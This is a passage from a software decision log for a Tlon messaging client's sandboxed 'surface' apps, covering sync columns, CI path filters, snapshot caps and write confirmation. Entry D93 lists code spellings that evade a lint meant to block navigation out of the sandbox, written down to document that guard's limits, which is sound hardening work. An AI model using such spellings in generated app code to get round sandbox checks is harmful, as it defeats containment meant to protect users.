  | `isDmInvite`           | **exclude**    | DM invite state (`chatApi`, `dmActions`, `sync.ts` L1879). Has `default(false)`, so `excluded.is_dm_invite` is `0`, not null — a group sync would flip a true invite to false.                                                                                                                                                                                                                                                                                                                                                                                                                            |
  | `isNewMatchedContact`  | **exclude**    | Contact-discovery flag; no %groups analogue.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
  | `lastViewedAt`         | **exclude**    | Local read position (`channelActions.ts` L708).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
  | `syncedAt`             | **exclude**    | Local sync bookkeeping. (Note: `channels.syncedAt` currently has **no writer at all**; only `groups.syncedAt` is written. Excluded on principle regardless.)                                                                                                                                                                                                                                                                                                                                                                                                                                              |
  | `remoteUpdatedAt`      | **exclude**    | Sourced from unreads `recency`, not from a group payload. Also currently unwritten.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
  | `order`                | **exclude**    | `posts_order`, written from `%channels` init (`insertChannelOrder`) and local post actions.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
  | `postCount`            | **exclude**    | Derived locally.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
  | `unreadCount`          | **exclude**    | From `%activity`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
  | `firstUnreadPostId`    | **exclude**    | From `%activity`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
  | `lastPostId`           | **exclude**    | `setLastPosts`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
  | `lastPostAt`           | **exclude**    | `setLastPosts`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
  | `lastPostSequenceNum`  | **exclude**    | Post sync.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |

  13 updated + 16 excluded = 29 = `getTableColumns($channels)`, asserted by
  `packages/shared/src/db/insertGroupsChannelColumns.test.ts`.

- **The pin test as specified is not, on its own, capable of failing on a
  new column — and this matters.** "Assert `getTableColumns($channels)`
  equals the union of setAll coverage and the exclusion list" is a
  tautology when coverage is _computed_ as `schema − exclusions`: a new
  column lands in `updated`, the union is still the whole table, green. The
  guard that actually fails is a **pinned literal list of the updated
  columns**, so an addition shows up as a diff someone has to read and
  re-classify. The union assertion is kept because it catches the other
  direction — an exclusion entry that no longer names a real column, e.g.
  after a rename — which was demonstrated separately by misspelling
  `lastViewedAt` in the list. Both negative controls were run: a synthetic
  `syntheticUnclassified` column added to `schema.ts` failed the pin
  assertion (`+ "syntheticUnclassified"`), and the misspelled exclusion
  failed the union assertion (`+ "lastVeiwedAt"`). Both mutations were
  reverted and the file diffs confirmed empty.

- **`insertChannelsInternal` is left diverged, deliberately.** It keeps its
  own four exclusions and is not pinned. It is fed by DM/`%channels` paths
  whose `Channel` objects carry a different subset than `toClientChannel`
  does, so a shared list would be wrong for one of the two callers — the
  divergence is the correct state, and the comment above the new
  `onConflictDoUpdate` says so explicitly to stop a future reader
  "fixing" it by cloning. **Residual, unclosed:** it is already
  `conflictUpdateSetAll`, so its failure mode on a newly added column is
  the _opposite_ one — over-update, i.e. nulling a client-local column its
  callers do not carry — and nothing pins it. Recorded rather than fixed;
  expanding the guard to a second writer was outside this round's brief.

- **D78: the D75 write-ordering dependency is now load-bearing enough to
  show up in a test's setup.** No change to the D75 finding itself — it
  stands as recorded, and this entry only sharpens it. `handleGroupUpdate`'s
  `updateChannel` case writes the edited channel via `db.updateChannel`,
  then calls `syncGroup(…, {force: true})` against a fresh `api.getGroup`.
  Pre-D56 that forced sync could not disturb the columns the fact carried;
  post-D56, and now more so post-D76, it rewrites **every** column in the
  conflict-update set — title, description, `descriptionPayload`,
  `surfaceSpec`, and both colours.

  What this round added: the new live-path guard test
  (`handleGroupUpdate.test.ts`, "an r-channel edit fact carries the
  description payload and surface spec into the channel row") **cannot** let
  `api.getGroup` echo the edit, because then the forced re-sync would make
  the test pass even if `db.updateChannel` wrote nothing at all. It mocks a
  channel-less group so `insertGroups` skips its channel upsert entirely.
  That the test has to be written that way _is_ the evidence that the two
  writes are now indistinguishable from outside — which is exactly the
  condition under which a scry returning pre-edit state would revert a
  correct write. Symptom to expect if `%groups` ever emits a fact before
  updating its state: a metadata edit that visibly reverts a second or two
  later. Still judged low-risk (%groups updates state before emitting), and
  still not worked around.

- **D79: the live verification behind this fix was performed as the
  channel's own host. Recorded as an inference, not an observation.** The
  client used to confirm the surface-spec propagation was the host of the
  channel it edited, not a remote member. The result is judged to
  generalise because host-ness is not consulted anywhere on the touched
  paths: `currentUserIsHost` is _computed_ by `toClientChannel` (host of the
  channel id vs the current ship) and _written_, never _read_, by
  `insertGroups`, `insertChannelsInternal`, `updateChannel`, or
  `handleGroupUpdate`'s channel cases; and the conflict-update set is a
  static column list with no per-ship branching. Remote delivery of an
  `r-channel` edit is pre-existing `%groups` machinery that this change does
  not touch. **What that argument does not cover, and nobody has observed:**
  a remote member's `toClientChannel` runs with a _different_ `readers ∩
currentUserRoles`, which is precisely the `currentUserIsMember` value this
  audit decided to keep excluded. That decision is defended by three
  independent in-repo comments rather than by the live test, and the live
  test could not have exercised it — a host is always a member. Anyone
  revisiting the `currentUserIsMember` exclusion should treat it as
  unobserved on the remote path.

## Fix round decisions (CI: the headless preview leg and the path-filter class)

- **D80: the surface preview's headless leg was wired into the one job
  that cannot run on the branch that introduced it, and would have failed
  if it had.** Two independent defects in a single step placement, worth
  separating because they have different fixes.

  _It never ran._ `bot-checks` is gated `needs.changes.outputs.app ==
'false' && needs.changes.outputs.bots == 'true'` (ci.yml:210-211).
  `app` is an ignore-list evaluated with `predicate-quantifier: every`, so
  any file outside the five exclusions sets `app=true` — and this branch
  touches `packages/app/**` and `apps/tlon-web/**`. `bot-checks` is
  therefore skipped on every commit of the branch that added the step, and
  `test-build` (`app != 'false'`, ci.yml:102) runs instead with no browser
  flag. Corroborated, not just read: the last 12 `ci.yml` runs all show
  `test-build` executed and `Bot Package Checks` skipped; runs 33191369729
  and 33190639060 (`db/quarantine-auth-failures`) show the reverse. Never
  both, in either direction.

  _It would have failed._ `pnpm --filter '@tloncorp/tlon-skill' check`
  needs the shell's **built** artifact, and `bot-checks` had no
  `build:surface-shell` step (the only occurrence in the workflow was in
  `test-build`). Demonstrated by hiding `packages/surface-shell/dist` and
  running the suite: `error: Cannot find module
'@tloncorp/surface-shell/artifact-strings'`, 0 pass / 1 fail / 1 error.

  **Correction to the brief that ordered this fix:** it is the `pnpm test`
  half of `check` that dies, not the typecheck. `tsc` runs
  `moduleResolution: Node`, cannot follow an `exports` subpath at all, and
  `surface-preview.ts` carries `@ts-expect-error` on each such import for
  exactly that reason — so `typecheck:src` exits 0 with or without `dist/`
  and proves nothing here. Recorded because "the typecheck catches it" is
  a false sense of coverage that would survive the fix.

- **D81: both jobs carry the leg, because the two jobs are mutually
  exclusive and each is some PR's only job.** `test-build` runs when
  `app != 'false'`, `bot-checks` when `app == 'false'`; no PR runs both, so
  adding the leg twice costs one run, not two. `test-build`-only would
  have reproduced the identical bug for the opposite diff shape — a
  tlon-skill-only PR skips `test-build` entirely. Relaxing `bot-checks`'
  `app == 'false'` gate was considered and rejected: the job exists only to
  cover what `test-build` would have covered (ci.yml:194-202), and dropping
  the gate makes its other six steps duplicate `test-build`'s repo-wide
  equivalents on every mixed PR forever, for zero new coverage.

  In `test-build` the leg is a targeted `bun test
./scripts/surface-preview.test.ts` with `TLON_PREVIEW_BROWSER=1`, because
  `pnpm test:ci` already runs the rest of that suite; in `bot-checks` the
  env var rides on the existing `check` step. Verified locally with the
  exact command: 24 pass in 9.11s with the flag, 23 pass + **1 skip** in
  91ms without it. The flag is load-bearing and the step is not decorative.

- **D82: the missing shell build is not a `bot-checks` bug, it is a
  clean-checkout bug, and it had two more instances outside ci.yml.**
  `tlon-skill-publish.yml`'s `quality` job runs the same
  `pnpm --filter '@tloncorp/tlon-skill' check` after only `pnpm build:api`,
  and its `build` matrix job compiles the CLI binary — which bundles
  `scripts/main.ts` and reaches the same import. Demonstrated for the
  build path too: with `dist/` hidden, `node scripts/build.js` fails with
  `error: Could not resolve: "@tloncorp/surface-shell/artifact-strings"`.
  Both got `pnpm build:surface-shell`. The release gate deliberately does
  **not** get the headless leg: it already ran on the PR that produced the
  tag, and a release gate is the wrong place to first discover a browser.

- **D83: "classified in both path filters" is not a symmetrical edit,
  because the two filters are opposite shapes.** `packages/surface-shell`
  appeared in neither filter. In the `app` ignore-list, membership is the
  **absence** of an exclusion — the shell is already classified there and
  the correct edit is a comment saying so, since the app embeds the built
  shell in its sandbox host and a shell-only change must run the app suite.
  In `bots`, membership is the **presence** of an entry, so the glob was
  added.

  The `bots` entry is inert today and that is stated in the workflow rather
  than glossed: a shell change also sets `app=true`, and `bot-checks`
  requires `app == 'false'`, so the entry can never be the deciding
  condition as things stand. It is there for the state one careless edit
  away — someone excluding the shell from `app` believing it bot-only. With
  the entry, that lands on `bot-checks`; without it, on nothing at all.

- **D84: the class fix is a check that reads ci.yml and the workspace and
  asserts every package is selected by some filter.** The defect class is
  not "the shell was forgotten", it is "a package can exist and be
  classified nowhere" — and the ignore-list makes that silent: exclude a
  package from `app`, forget the positive list, and every gated job skips
  while `CI OK` reports green over a diff nothing looked at.

  `scripts/check-ci-path-filters.mjs` parses the real
  `dorny/paths-filter` steps out of `.github/workflows/ci.yml` (patterns,
  and `predicate-quantifier` per step), expands the real `packages:` globs
  from `pnpm-workspace.yaml`, and for each package evaluates
  `<package>/package.json` against every filter with paths-filter's own
  semantics — `every` means all patterns including negations, `some` means
  any. Zero packages may match zero filters. It hardcodes neither the
  package list nor the filter names, so it cannot drift from what it
  guards; unsupported glob syntax throws rather than being silently
  mis-evaluated. Three secondary assertions ride along: a filter defined
  but read by no job condition, a negated pattern under a `some`
  quantifier (the pre-#6128 dead-letter bug), and a filter naming a
  package directory that no longer exists.

  Per the round's third rule it was shown failing, not just passing.
  Dropping `packages/tlon-skill/**` from `bots` while it stays excluded
  from `app`: _"packages/tlon-skill is not classified by any path filter
  … so every gated job would skip and CI OK would pass without running
  anything."_ Excluding `packages/surface-shell` from `app` **without**
  the new `bots` entry fails the same way; **with** it, it passes — which
  is the argument for D83 made executable. Renaming a package out from
  under a filter entry raises both the uncovered package and the stale
  entry.

  It runs in a new `ci-config-check` job with **no `needs` and no `if`**.
  That is the whole point: a package no filter selects skips every
  filter-gated job by construction, so a gated guard could never observe
  it. The job is in `ci-ok`'s `needs`, so it blocks merges.

- **D85: the snapshot state cap is tied to the reducer's state cap, not set
  independently.** They were 64 KB and 128 KB, which made a band of live
  states legal to hold and impossible to write down. Publish folds such a
  state, moves the description to a preserving revision, mirrors it, and
  only then finds the snapshot will not validate — so the channel lands on
  a revision that demands a migration snapshot nobody can post.

  Reproduced whole before it was fixed, from eighteen ordinary host events
  (one op each, every op inside the 4 KB op-value cap and every entry
  inside the 8 KB entry cap): state 68,590 bytes, `stateFull: false`;
  `publish --preserve-state` exits 1 with `{"code":"invalid-ops",
"message":"The snapshot record does not satisfy its schema: snapshot
state exceeds 65536 bytes","details":{…,"definitionPublished":true}}`;
  the stored definition sits at `specRevision=2, preserveState=true` with
  two mirrors and zero snapshots; `surface state` answers
  `migration-pending`; `surface snapshot` refuses with `migration-pending`;
  an exact retry answers `{"ok":true,…"outcome":"no-op"}` — reporting
  success over a dead channel — and a further preserving publish refuses
  with `migration-pending`. Every exit blocked; the only escape discards
  the state.

  The invariant is **a state the reducer will hold must be a state a
  snapshot can carry**, so the control is the invariant rather than either
  number: `snapshotState >= reducedState`, plus a real fold up to the
  reducer's own limit that the snapshot schema then has to accept. At
  128 KB a snapshot post jams to roughly 131 KB against `%channels-server`'s
  256,000-byte `size-limit` — about half of it, still comfortable, but the
  cap can no longer be raised freely and the next raise has to price the
  backstop.

- **D86: no validation of a record a command intends to write may happen
  after that command's first write.** Aligning the caps closes the instance;
  the ordering is the class. `--preserve-state` makes the migration snapshot
  mandatory the moment the definition lands, so any record that fails
  validation afterwards leaves the channel demanding a snapshot nobody can
  post — and that is as true of the mirror (posted first, so its failure
  stops the command before the snapshot) as of the snapshot itself.

  Publish now assembles and validates both records before the description
  cell moves, and posts _those objects_, not copies of them — validating one
  value and writing another is the raw-versus-validated defect of D67/D72.
  What stays after the write is only what needs the write to have happened:
  the description read-back (`publish-unconfirmed`) and each post's
  read-back and kind-tail check (`post-unconfirmed`, `kind-tail-lost`).
  Those are confirmations, not validations — they cannot fail on account of
  anything knowable in advance, so hoisting them is meaningless rather than
  merely hard. The test forces the snapshot record invalid through the
  injected validator rather than through a size, because with the caps
  aligned no legal state can produce the failure any more and the property
  under test is the ORDER, not the cap that exposed it. Relocating the check
  to after the write fails it.

- **D87: `surface snapshot` at a pending revision is the repair, and repair
  reconstructs rather than defaults.** The refusal that stood there forbade
  the only exit a stranded channel has. It was guarding something real —
  there is no folded state at a pending revision, so a naive snapshot would
  invent one — and the guard is kept by reconstruction, not by removal.

  The state cannot come from the current revision, whose events no longer
  fold; it comes from the definition the state was last live under, which
  the channel already keeps as the spec-mirror posts. Three protections
  carry the old refusal's intent: only the channel host may repair (a
  non-host snapshot is ignored by every reducer, so a non-host "repair"
  would report a fix that never happened); the previous definition is taken
  only from a host-authored, schema-valid mirror (otherwise a member could
  steer the fold that decides what the surface's state becomes); and where
  the previous state is not reconstructable — earlier-revision events with
  no mirror of that revision, or a previous revision itself pending — it
  refuses instead of defaulting. `initialState` is used in exactly one case,
  no earlier revision and no earlier-revision events, where it is the true
  answer rather than a fallback.

  The boundary is the carried state's own coverage (`newestFoldedSeq`), not
  the newest post: events already written at the current revision sit above
  it and go on folding, where a newest-post boundary would freeze them out
  silently and permanently. `--up-to` is refused on the repair path for the
  same reason. Each of these is mutation-checked — removing the host filter,
  removing the never-fabricate guard, or taking the boundary from the newest
  post each fails exactly one test.

- **D88: every error code carries a class, and the class says who can fix
  it.** The stranding returned `invalid-ops` — an author-error code — with
  the author's ops valid and the definition already published. That is not a
  cosmetic mislabel: the skill's doctrine reads an author-error code as
  "your files are wrong, fix and retry", so a system-level refusal wearing
  one sends the bot to regenerate a working app and republish over a channel
  that needed repairing, not regenerating.

  `SURFACE_ERROR_CLASS` is a total `Record<SurfaceErrorCode,
'author' | 'environment'>` beside the code list; `surfaceError` stamps
  `details.errorClass` last, so a call site cannot relabel its own failure
  and every `--json` document carries the class without the dispatcher
  learning a field. The new `state-too-large` (class `environment`) is
  raised by `assertSnapshotRecordValid`, which asks the schema rather than
  re-reading the cap — a second copy of the number here would be a second
  definition of the wire format — and carries the schema's own issue text,
  so even the unreachable non-size failure cannot mislead.

  Two drift controls, both shown failing. `bun test` strips types, so the
  exhaustive `Record` is re-checked at runtime: adding a code without a
  class fails it. And SKILL.md's table is checked against the code rather
  than proofread — every code it names must be filed under the class the
  CLI actually gives it, so filing `state-too-large` as `author` fails.
  The table need not name every code; an unnamed one falls through to
  `details.errorClass`.

  SKILL.md's own doctrine was wrong in the same direction and is corrected:
  "a command error is verified failure" is true of the command and false of
  its effects, so the failure section now turns on `details.definitionPublished`
  — with it, the definition is live and only the records after it are
  missing, and the remedy is `tlon surface snapshot <channel>`, never a
  republish and above all never a republish without `--preserve-state`,
  which unsticks the board by emptying it.

- **D89: a snapshot's state and the boundary it claims are one fact, so
  `--up-to` folds to the boundary rather than stamping a boundary on a wider
  fold.** `surface snapshot --up-to N` reduced the whole history, accepted any
  N no greater than the newest post, and wrote that full fold as the state for
  N. The reducer trusts the pair and never checks it — it starts from the
  snapshot's state and replays every event strictly above the boundary — so
  the events between N and the newest post were in the state AND replayable.
  Two appends and `--up-to 1` produced `["a","b"]` under a boundary of 1, and
  the next fold returned `["a","b","b"]`, permanently, for every client.

  The fix folds only the posts at or below N. Rejecting any boundary but the
  fold watermark would also have closed the duplication, and was rejected:
  `--up-to` earns its place — a snapshot boundary below the newest post is
  what leaves the tail replayable, and therefore retractable, since an edit
  only retracts an event the reducer still replays. A flag that accepts one
  value is a flag that should not exist.

  The boundary is inclusive in both directions, and both are load-bearing.
  Folding past it double-counts; folding short of it freezes the events below
  out, because the reducer never looks under a boundary again — an exclusive
  filter writes `[]` under a boundary of 1 and the event at sequence 1 is gone
  for good. One refusal is new: below the sequence at which a preserving
  revision's own snapshot was posted, that revision has no state at all, so
  the bounded fold returns `migration-pending` and the command says so instead
  of writing something. Without it the record falls through to the schema and
  the channel is told its state is too large.

  Three controls, each shown failing. The duplication test fails before the
  fix with the fold's `["a","b"]` under boundary 1 and the replayed
  `["a","b","b"]`. Mutating `<=` to `<` fails the boundary-inclusive test.
  Mutating the no-state-at-this-boundary guard away fails the refusal test
  with `state-too-large` — the misleading code the guard exists to prevent.

  The class was swept. `repairPendingMigration` (same file) already takes its
  boundary from the carried state's own coverage, and `surface preview` and
  `surface lint` pair `initialState` with a boundary of 0 while synthesising
  their invokes at sequence 1 and above — all three fold and claim the same
  events. One residual sits in `surface-publish.ts:foldForMigration`, out of
  this change's scope: when a `--preserve-state` publish finds no readable
  current definition it pairs the new definition's `initialState` — which
  covers nothing — with a boundary at the newest post. Under a new spec whose
  action sets `acceptStale`, an old-revision invoke below that boundary is
  neither carried into the state nor replayable afterwards. The same situation
  is an explicit refusal on the repair path ("reconstructing the state would
  mean guessing at it") and a silent freeze-out here.

- **D90: a write is confirmed by evidence the write PRODUCED, never by
  evidence that matching state is present.** Two observations accepted
  pre-existing state as proof of a new write, and both reported success for a
  poke that did nothing.

  `postSurfaceRecord` recognised its own post by author, `sent` and blob. All
  three are sender-chosen — `sent` especially, which the sender supplies and
  the host does not stamp (D53) — so a matching post already in the channel
  satisfied every one of them. With a silent no-op send over an identical
  earlier post, the writer returned success and the OLD post's id; a second
  run of the same command in the same millisecond is enough to produce that
  pair. It now reads the channel's head before poking and requires the
  matched post to sit above it. Strictly: where the channel was sequenced at
  all, the proof must be a `%channels-server` sequence number above the
  pre-write maximum, and a post the host has not sequenced is not proof of
  anything the host did. The id set is the fallback for the one case with no
  head to sit above — a channel with nothing sequenced in it — and it is
  sound because the baseline is read at the same window size as the
  observation, so anything the observation sees that the baseline did not
  hold arrived after the baseline. The failure names the offending post
  (`details.matchedExistingPost`) rather than saying "not confirmed": "an
  identical post is already there" and "nothing arrived" have different
  causes.

  `surface create` verified a name it had not necessarily assigned. The
  candidate loop drew a fresh random name on its last pass and exited with it
  unchecked, so nine names in use meant creating under a ninth name nothing
  had looked at. The ninth-candidate path is deleted rather than repaired:
  eight collisions in a row mean the name space is exhausted or the generator
  is degenerate, and in neither case is a ninth draw likelier to be free —
  only likelier to be unchecked. Exhaustion is now a clean `name-taken`
  refusal with the drawn candidates in `details`, and nothing is poked.

  Deleting that path fixes the incident, not the class: presence in both
  agents is equally what a silent no-op onto a name taken since the
  pre-flight check looks like, and that no-op leaves the channel it landed on
  untouched. So the observation additionally requires `%groups` to list the
  channel under the title THIS command poked with — a value that reaches
  `%groups` only if `%groups` took our create. The `added` timestamp was
  considered as a stronger host-stamped identity and rejected: comparing it
  against a locally-read clock makes every create fail on a skewed one, which
  is a guarantee the data cannot give. The residual is a rename landing
  inside the poll interval of the create it renames, which reports
  `create-unconfirmed` for a create that worked; the reverse error, reporting
  a title the channel does not carry, is the one that leaves a caller acting
  on a channel it does not own.

  The report now carries the title READ BACK. On the create path the two are
  equal because the observation refused to finish until they were; on the
  reuse path they are routinely different, since `--on-collision reuse`
  renames nothing, and the old report echoed the requested title over a
  channel that had its own.

  Two changes to the fake ship are faithfulness, not accommodation. Sequence
  numbers are now stamped above every sequence the channel holds rather than
  at the list length, because a sequence that can go backwards is not the
  ship's; and `applyCreate` under a name `%channels` already holds is a
  silent no-op that still resolves, which is D50 itself and was the one part
  of D50 the double could not express. Both are load-bearing: reverting
  either makes a test fail.

  Every control was shown failing first. Pre-fix, the writer returned
  `{postId: "post-1"}` with one post in the channel and nothing sent, and
  create reported `ok:true, reused:false, title:"Potluck"` over a channel
  stored as `"Existing 9"`. Post-fix both refuse, and each check is
  mutation-checked separately: `postdatesHead` forced true fails the writer
  control, restoring the ninth-candidate loop fails the loop control (with
  `create-unconfirmed` rather than `name-taken` — the title check catches
  what the loop bug lets through, which is what makes it the class fix), and
  removing the title check fails the race control while the loop fix stays in
  place.

  The class was swept across every mutating call in the command set — the
  five `deps.createChannel` / `writeGroupChannel` / `sendSurfacePost` /
  `editSurfacePost` / `uploadBundle` sites and the four `observeUntil`
  probes. `surface publish`'s read-back compares the raw cell against the
  exact bytes written, which pre-existing state could satisfy, but the
  revision bump means the cell cannot already hold what a changed publish
  writes, and an unchanged one takes the no-change path. `uploadBundle` is
  out of the class: `uploadFile` stamps a timestamp into every key, so the
  URL it returns cannot be a pre-existing object's. One genuine residual
  remains, in `retractSurfacePost`: it observes `isEdited`, which a post
  edited by anything earlier already satisfies, so retracting an
  already-edited post reports success whether or not the `%edit` landed. The
  effect on the fold is right either way (the reducer skips any edited
  surface post), and what is over-claimed is the rewritten fallback text.
  Fixing it properly needs the host-stamped edit revision on
  `SurfacePostRecord`, which is a `surface-common.ts` and runtime change;
  refusing an already-edited post instead would trade a false success for a
  false failure on the retry of a half-failed retraction, so it is filed
  rather than guessed at.

- **D91: an op refused by a resource cap aborts the rest of its entry; an op
  the author got wrong does not.** **Superseded by D98: the skip/abort
  criterion is withdrawn entirely and every refusal now aborts. The incident
  and the prefix-versus-subsequence reasoning below still stand; the
  classification built on top of them does not — read the rest of this entry
  as the history of a rule that no longer holds.** (D98 claimed both D91 and
  D94 were "annotated in place"; D94 was, this entry was not, and the
  omission was found in Session 6a's orientation pass. Recorded here because
  a superseding entry that misreports its own bookkeeping is the same defect
  class as a guard that cannot fail.) §7 had one rule for every per-op refusal —
  skip that op, apply the rest — and PARADIGM built the host-is-the-clock
  rollover on top of it, calling it fully idempotent and gracefully
  degrading. The two combine into data loss at the 128 KB live-state cap:
  the rollover's archiving `set` grows state and is refused, its `del /today`
  shrinks state and still applies, and the day ends up neither archived nor
  present. Verified against the reducer with a state 10 bytes under the cap.

  The incident fix is to stop the `del`. The class fix is the distinction the
  incident exposed. Under skip-and-continue the state after an entry is an
  arbitrary **subsequence** of its ops, and a subsequence can contain a
  destructive op without the op it depended on. Aborting on a cap refusal
  makes it a **prefix**, which is the strongest property available without a
  transaction log, and it is what makes "archive, then clear" safe: the clear
  is unreachable unless the archive landed.

  Grammar and shape refusals keep skip-and-continue, and the difference is
  not severity. A malformed pointer, a `$actor` misuse, a forbidden segment
  is wrong as written: it is refused identically on every client, the author
  meets it on the first fold, and the rest of a mostly correct entry is still
  worth applying. A cap refusal is the environment's answer to an op that is
  exactly what the author meant — it appears only at a volume of state the
  author never had, so nothing about the entry itself is a warning that the
  ops after it are about to run alone.

  Determinism was the condition for touching the reducer at all, since it is
  the one component every client runs identically. State is a pure function
  of the post log (posts are sorted by sequence number and blob index, and
  unsequenced posts never fold), and both caps are pure functions of state
  and the op — the size cap through `JSON.stringify`, whose key order is
  insertion order and therefore fixed by the op sequence, and the depth cap
  from the op alone. So every client aborts at the same op of the same entry.
  Nothing in the decision reads a clock, an allocator, or anything else that
  is client-local.

  The depth cap is grouped with the size cap deliberately, and it is the one
  judgment call here. Unlike the size cap it is computable from the op alone,
  so by the "same at every fold position" test it would sort with the author
  errors. It aborts anyway, because the classification that matters is what
  the refusal means rather than when it is detectable: both are "state cannot
  hold this", and a `del` following a depth-refused `set` destroys data
  exactly as it does following a size-refused one.

  `stateFull` keeps its narrow meaning — the size cap, the one refusal a host
  repairs by snapshotting and pruning, which is what "dashboard full" asks
  for — and a depth refusal does not raise it. The reduction gained
  `abortedEventCount` instead, so a partial entry is reported as such rather
  than inferred from a flag that means something else. An aborted entry still
  counts as folded and still advances `newestFoldedSeq`: it was processed to
  a deterministic conclusion, and holding the watermark back would make
  hydration re-request it forever.

  In code the distinction is one classification, not two branches.
  `applyOp` now returns a `refusal` alongside its error — `grammar`,
  `structure`, or `depth-cap` — the reducer adds `state-cap`, the one cap
  only it can see, and a single `RESOURCE_REFUSALS` set decides skip or
  abort. Deciding by matching the error message text was the alternative and
  is what the refusal kind exists to avoid.

  One residual, pinned by a test rather than left to be rediscovered.
  `structure` refusals — writing through a scalar, appending onto a
  non-array — depend on accumulated state exactly as the size cap does, and
  reproduce the same loss when a `del` follows one. They stay on the skip
  side because this amendment ratifies resource caps only. PARADIGM's
  doctrine rule is what covers them, and it is now stated there explicitly
  rather than left implicit in the worked example: no destructive op whose
  safety depends on a preceding op succeeding, unless both sit in the same
  entry with the destructive one second.

  Every control was shown failing first. Pre-fix the near-cap rollover left
  neither `/history/2026-08-29` nor `/today`, and the prefix property's
  shrunk counterexample was the bare `[{"op":"del","path":"/today"}]`. The
  controls that pin unchanged behavior cannot fail pre-fix by construction,
  so each is mutation-checked instead: adding `grammar` to
  `RESOURCE_REFUSALS` fails the author-error property, adding `structure`
  fails the residual's test, removing `depth-cap` fails the depth control,
  turning the abort back into a `continue` fails the rollover control and the
  prefix property, raising `stateFull` for every resource refusal fails the
  depth control, and dropping the aborted entry from `foldedEventCount` fails
  the watermark assertion.

- **D92: a rule that only ever sees the first paint is a rule about the first
  paint, not about the app — so the gate now presses the app's controls, and
  the chart oracle moved onto the live instance.** `foldAndRender` called
  `runShellFixture` and `sendState` and nothing else. `ShellFixtureRun` has
  exposed a `click(selector)` since it was written and no caller used it, so
  no event handler body had ever executed inside the gate. Four rules were
  narrower than they read as a result — `chart-sizing`, `jargon`,
  `smoke-render` and (through its new behavioral half) `navigation-vector`
  all saw the initial render and the post-`sendState` renders and nothing
  else.

  **Finding controls by selector was rejected.** `button, [role=button], a`
  misses `<div onClick=…>`, which htm/Preact bind exactly as readily, and a
  control the gate cannot find is a handler the gate cannot run. Preact
  attaches through `addEventListener`, so the gate wraps that method for the
  duration of the phase and learns every listener the app took, on whatever
  element. One measured wrinkle is worth recording because it looks like
  over-engineering otherwise: `win.EventTarget.prototype.addEventListener`
  and the `addEventListener` an element actually resolves are the SAME
  FUNCTION on happy-dom 20 but live on two different prototype objects
  (`el instanceof win.EventTarget` is `false`), so patching the former
  records nothing at all. The gate walks a real element's prototype chain to
  the object that owns the method instead.

  Each pass marks a control with a `data-` attribute, calls the fixture's own
  `click(selector)`, and reads the invoke messages that came back — which is
  how a control is mapped to the action it drives, since the gate already
  cross-references `invoke(actionId)` and the shell already stamps `actionId`
  onto the outbound message. Controls that appear only after another control
  is pressed are picked up on the next round.

  **What it cannot do is reported, never passed.** Three shortfalls exist and
  each names itself in a skip on all four widened rules: a declared action no
  activated control invoked (named individually), controls bound only to
  events the gate does not dispatch (`change`, `input`, `keydown` — named by
  type), and the 64-click budget running out, which is what makes a control
  that spawns a control terminate. The budget is a guard rather than a rule,
  and it is tested anyway. `skipped` now carries partial coverage as well as
  "did not run"; the reason string says which ("not fully exercised — …").

  **The chart oracle (finding 6) is fixed at the root.** The recording
  stand-in pushed `{config}` and the rule read `config.options`, so a bundle
  that constructed with `responsive: true` and then reassigned
  `chart.options` passed clean. The stand-in now pushes the INSTANCE and the
  rule reads `instance.options` at check time — after the render pass and
  after the controls have been pressed — with destroyed instances skipped,
  since the primitive tears one down when it leaves the tree. The fixture is
  both halves at once: it constructs responsively through the raw escape
  hatch in a ref and unmakes it in an `onPress`, so it needs the live read
  AND the click to be caught. Against the pre-change gate it is
  `PASSES CLEAN`.

  **The canvas-attribute leg was documented wrong, and the doc was the
  defect.** `PARADIGM.md` (and `PRIMITIVES.md`, and plan §9) said a real
  smoke render asserts no canvas carries `width`/`height`. Real Chart.js
  sets exactly those: `retinaScale` assigns `canvas.height`/`canvas.width`
  (`chart.js/dist/chunks/helpers.dataset.js:2329-2330`) and both reflect to
  content attributes — measured independently by rendering the real workout
  template through the real shell in Chromium. The check is sound only
  because the gate substitutes a stand-in that never touches the backing
  store, which makes it a statement about the gate's environment and not
  about Chart.js. Both skill docs now say that; **plan §9 (line 388) still
  carries the old sentence and was left alone deliberately — this round's
  scope for that file was §5 only.**

  Every control was shown failing. Running the new fixtures against
  `HEAD`'s gate: `chart-options-reassigned-on-press` PASSES CLEAN → now
  `chart-sizing`; `handler-throws-on-press` PASSES CLEAN → `smoke-render`;
  a handler on a plain `<div>` PASSES CLEAN → `smoke-render`; jargon
  assembled from pieces and written into the DOM on press PASSES CLEAN →
  `jargon`. The compliant fixture still reports zero skips, which is the
  assertion that the press actually landed rather than the activation
  quietly doing nothing.

- **D93: rule 5 is a lint that catches naive spellings, the docs now say so,
  and its two commonest firings were false positives.** The gate's rule 5
  docstring and plan §5 both called the publish gate "the PRIMARY boundary"
  against navigation egress. It is not one and cannot become one, for two
  reasons that are properties of the approach rather than gaps in the list:
  the rule enumerates over a platform capability set that is open and still
  growing, and property access is not a lexical property of source.
  `window["loc" + "ation"]`, `globalThis["loc" + "ation"]`,
  `Reflect.get(window, 'location')`, `document.defaultView[…]`, a getter, an
  alias through a local, a unicode escape inside the identifier and a
  template-literal property name all pass rule 5 clean today. Re-measured
  against both gates on the audit's own probe batch: **1 of 18 spellings
  caught before this round, 5 of 18 after** — the four new ones are the
  routes below, and the thirteen that still pass are all forms of the same
  fact, that what an expression resolves to is not readable from its text.
  Containment on web
  is the host page's `frame-src` allowlist pre-flight (D43 — recorded here
  as "written and disabled", which D171 corrects: it ships ENFORCING,
  `ENFORCE_HOST_CSP = true`) and structurally the M4 Worker realm (D36).
  `sandbox/document.ts:83-88` had already stated that position for the
  in-realm hardening; rule 5 sits under the same sentence and now says so in
  its own docstring, in plan §5, and in `PARADIGM.md` — which had told
  generating models that the sandbox "denies … navigation", the same false
  claim one layer down. **Two instances were left standing on purpose: plan
